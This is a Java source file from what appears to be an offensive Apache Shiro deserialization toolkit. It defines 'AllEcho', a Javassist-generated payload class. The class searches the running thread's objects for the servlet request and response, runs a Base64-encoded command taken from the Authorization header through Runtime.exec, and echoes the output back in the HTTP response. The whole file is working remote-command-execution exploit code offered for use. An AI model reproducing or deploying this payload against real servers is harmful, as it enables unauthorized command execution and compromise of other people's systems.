package com.summersec.attack.deser.echo;
//Author:fnmsd
//Blog:https://blog.csdn.net/fnmsd
// https://gist.github.com/fnmsd/4d9ed529ceb6c2a464f75c379dadd3a8
import com.summersec.attack.deser.util.Gadgets;
import javassist.*;

import java.io.*;


public class AllEcho implements EchoPayload {


    @Override
    public CtClass genPayload(ClassPool pool) throws Exception {
        CtClass clazz = pool.makeClass("com.summersec.x.Test" + System.nanoTime());
        if ((clazz.getDeclaredConstructors()).length != 0) {
            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
        }
        //HTTPServletRequest.class
        //HTTPServletResponse.class
        clazz.addField(CtField.make("static java.util.HashSet/*<Object>*/ h;", clazz));
        clazz.addField(CtField.make("static javax.servlet.http.HttpServletRequest r;",clazz));
        clazz.addField(CtField.make("static javax.servlet.http.HttpServletResponse p;",clazz));
//        clazz.addField(CtField.make("static int depth ;",clazz));

        clazz.addMethod(CtMethod.make("private static boolean i(Object obj){        if(obj==null|| h.contains(obj)){            return true;        }        h.add(obj);        return false;    }",clazz));
//        clazz.addMethod(CtMethod.make("private static void F(Object start, int depth){        Class n=start.getClass();        do{            java.lang.reflect.Field declaredField = null;            java.lang.reflect.Field[] fields = n.getDeclaredFields();            int length = n.getDeclaredFields().length;            for (int i =0 ; i <= length; i++){                declaredField = fields[i];                declaredField.setAccessible(true);                Object o = null;                try{                    o = declaredField.get(start);                    if(!o.getClass().isArray()){                        p(o,depth);                    }else{                        Object[] array = (Object[])o;                        for (int q = 0; q < array.length; q++){                            p(array[q], depth);                        }                    }                }catch (Exception e){                }            }        }while(                (n = n.getSuperclass())!=null        );    }",clazz));
        clazz.addMethod(CtMethod.make("private static void F(Object start, int depth){}",clazz));



        clazz.addMethod(CtMethod.make("private static void p(Object o, int depth){\n" +
                "        if(depth > 52||(r !=null&& p !=null)){\n" +
                "            return;\n" +
                "        }\n" +
                "        if(!i(o)){\n" +
                "            if(r ==null&&javax.servlet.http.HttpServletRequest.class.isAssignableFrom(o.getClass())){\n" +
                "                r = (javax.servlet.http.HttpServletRequest)o;\n" +
                "                if(r.getHeader(\"Host\")==null && r.getHeader(\"Authorization\") == null) {\n" +
                "                    r = null;\n" +
                "                }else{\n" +
                "                    try {\n" +
                "                        p = (javax.servlet.http.HttpServletResponse) r.getClass().getMethod(\"getResponse\",null).invoke(r,null);\n" +
                "\n" +
                "                    } catch (Exception e) {\n" +
                "                        r = null;\n" +
                "                    }\n" +
                "                }\n" +
                "\n" +
                "            }\n" +
                "            if(r !=null&& p !=null){\n" +
                "                try {\n" +
                "                    \n" +
                "                    p.addHeader(\"Host\",r.getHeader(\"Host\"));\n" +
                "                    try {\n" +
                "                        p.getWriter().println(\"$$$\" +  org.apache.shiro.codec.Base64.encodeToString(new java.util.Scanner(Runtime.getRuntime().exec(org.apache.shiro.codec.Base64.decodeToString(r.getHeader(\"Authorization\").replaceAll(\"Basic \",\"\"))).getInputStream()).useDelimiter(\"\\\\A\").next().getBytes()) + \"$$$\");\n" +
                "                    }catch (Exception e){}\n" +
                "                   \n" +
                "                    p.getWriter().flush();\n" +
                "                    p.getWriter().close();\n" +
                "                    \n" +
                "\n" +
                "                }catch (Exception e){\n" +
                "                }\n" +
                "                return;\n" +
                "            }\n" +
                "\n" +
                "            F(o,depth+1);\n" +
                "        }\n" +
                "    }",clazz));

        clazz.getDeclaredMethod("F").setBody("{Class n = $1.getClass();\n" +
                "        do{\n" +
                "            java.lang.reflect.Field f = null;\n" +
                "            int l = n.getDeclaredFields().length;\n" +
                "            for (int i = 0; i < l; i++) {\n" +
                "                f = n.getDeclaredFields()[i];\n" +
                "                f.setAccessible(true);\n" +
                "                Object o = null;\n" +
                "                try{\n" +
                "                    o = f.get($1);\n" +
                "\n" +
                "                    if(!o.getClass().isArray()){\n" +
                "                        p(o,$2);\n" +
                "                    }else{\n" +
                "                        Object q = null;\n" +
                "                        Object[] objs = (Object[])o;\n"+
                "                        int len = java.lang.reflect.Array.getLength(o);\n" +
                "                        for (int j = 0; j < len; j++) {\n" +
                "                            q = objs[j];\n"+
                "                            p(q, $2);\n" +
                "                        }\n" +
                "\n" +
                "                    }\n" +
                "\n" +
                "                }catch (Exception e){\n" +
                "                }\n" +
                "            }\n" +
                "\n" +
                "        }while(\n" +
                "                (n = n.getSuperclass())!=null\n" +
                "        );}");

        clazz.addConstructor(CtNewConstructor.make("public dfs(){       r = null;        p = null;        h =new java.util.HashSet/*<Object>*/();        F(Thread.currentThread(),0);    }",clazz));
        // 兼容低版本jdk
        clazz.getClassFile().setMajorVersion(50);

        return clazz;
    }

    public static void main(String[] args) throws Exception {
//        String echoOpt;
        Object template = Gadgets.createTemplatesImpl("AllEcho");



    }

}